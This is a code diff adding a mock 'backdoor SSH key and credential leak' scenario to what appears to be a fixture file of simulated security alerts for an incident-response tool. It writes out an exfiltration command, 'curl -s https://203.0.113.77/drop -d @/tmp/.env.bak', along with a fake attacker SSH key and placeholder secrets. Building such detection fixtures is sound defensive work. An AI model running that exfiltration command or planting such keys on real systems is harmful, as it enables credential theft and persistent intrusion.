@@ -140,7 +140,97 @@ const noise = [
   },
 ];
 
-const ALERTS = [...bruteForceAlerts, ...intrusion, ...malware, ...noise];
+// ─── Scenario 4: Backdoor SSH Key + Credential Leak on prod-web-01 ───────────
+// FIM detects authorized_keys modification + .env.bak staging + outbound exfil
+// Remediation mix: block_ip (Wazuh AR) + remove backdoor key (custom script)
+//                + invalidate leaked API token (custom script)
+
+const backdoor = [
+  // FIM: authorized_keys modified — new key added
+  {
+    id: 'alert-bkd-001',
+    timestamp: ts(50),
+    rule: {
+      id: '550',
+      level: 13,
+      description: 'Integrity checksum changed — possible backdoor key added',
+      groups: ['syscheck', 'fim'],
+    },
+    agent: { id: '001', name: 'prod-web-01', ip: '10.0.1.10' },
+    data: {
+      file: '/home/deploy/.ssh/authorized_keys',
+      syscheck: {
+        path: '/home/deploy/.ssh/authorized_keys',
+        md5_before: 'aabbcc1122334455aabbcc1122334455',
+        md5_after:  'deadbeefdeadbeefdeadbeefdeadbeef',
+        event: 'modified',
+      },
+    },
+    full_log: 'ossec: Integrity checksum changed for /home/deploy/.ssh/authorized_keys',
+  },
+  // FIM: .env.bak staged in /tmp — API credentials copied out
+  {
+    id: 'alert-bkd-002',
+    timestamp: ts(48),
+    rule: {
+      id: '554',
+      level: 12,
+      description: 'File added to system — sensitive credential file staged in /tmp',
+      groups: ['syscheck', 'fim'],
+    },
+    agent: { id: '001', name: 'prod-web-01', ip: '10.0.1.10' },
+    data: {
+      file: '/tmp/.env.bak',
+      syscheck: {
+        path: '/tmp/.env.bak',
+        md5_after: 'cafebabecafebabecafebabecafebabe',
+        event: 'added',
+      },
+      dstuser: 'deploy',
+    },
+    full_log: 'ossec: New file /tmp/.env.bak added — contains APP_API_KEY and DB_PASSWORD',
+  },
+  // Outbound connection — credential exfiltration to attacker
+  {
+    id: 'alert-bkd-003',
+    timestamp: ts(46),
+    rule: {
+      id: '100002',
+      level: 13,
+      description: 'Sensitive data exfiltration detected',
+      groups: ['firewall', 'exfiltration'],
+    },
+    agent: { id: '001', name: 'prod-web-01', ip: '10.0.1.10' },
+    data: {
+      srcip: '10.0.1.10',
+      dstip: '203.0.113.77',
+      dstport: '443',
+      protocol: 'tcp',
+      dstuser: 'deploy',
+      command: 'curl -s https://203.0.113.77/drop -d @/tmp/.env.bak',
+    },
+    full_log: 'bash[16000]: curl -s https://203.0.113.77/drop -d @/tmp/.env.bak',
+  },
+  // Subsequent SSH login from attacker using the backdoor key
+  {
+    id: 'alert-bkd-004',
+    timestamp: ts(30),
+    rule: {
+      id: '5715',
+      level: 8,
+      description: 'Authentication success',
+      groups: ['syslog', 'sshd', 'authentication_success'],
+    },
+    agent: { id: '001', name: 'prod-web-01', ip: '10.0.1.10' },
+    data: { srcip: '203.0.113.77', dstuser: 'deploy', program_name: 'sshd', method: 'publickey' },
+    full_log: 'sshd[16500]: Accepted publickey for deploy from 203.0.113.77 port 55000 ssh2',
+  },
+];
+
+// Backdoor key value (what the FIM diff would show as added)
+const BACKDOOR_KEY = 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7attacker+key== attacker@c2';
+
+const ALERTS = [...bruteForceAlerts, ...intrusion, ...malware, ...noise, ...backdoor];
 
 // ─── Processes per agent ──────────────────────────────────────────────────────
 
@@ -174,4 +264,28 @@ const PROCESSES = {
   ],
 };
 
-module.exports = { ALERTS, AGENTS, PROCESSES };
+// ─── FIM detail per agent — returned by syscheck queries ─────────────────────
+
+const FIM = {
+  '001': [
+    {
+      path: '/home/deploy/.ssh/authorized_keys',
+      event: 'modified',
+      md5_before: 'aabbcc1122334455aabbcc1122334455',
+      md5_after:  'deadbeefdeadbeefdeadbeefdeadbeef',
+      diff: `--- authorized_keys.before\n+++ authorized_keys.after\n+${BACKDOOR_KEY}`,
+      user_name: 'deploy',
+      timestamp: ts(50),
+    },
+    {
+      path: '/tmp/.env.bak',
+      event: 'added',
+      md5_after: 'cafebabecafebabecafebabecafebabe',
+      content_preview: 'APP_API_KEY=sk-prod-abc123xyz789\nDB_PASSWORD=Sup3rS3cr3t!\nSTRIPE_SECRET=sk_live_abc123',
+      user_name: 'deploy',
+      timestamp: ts(48),
+    },
+  ],
+};
+
+module.exports = { ALERTS, AGENTS, PROCESSES, FIM, BACKDOOR_KEY };
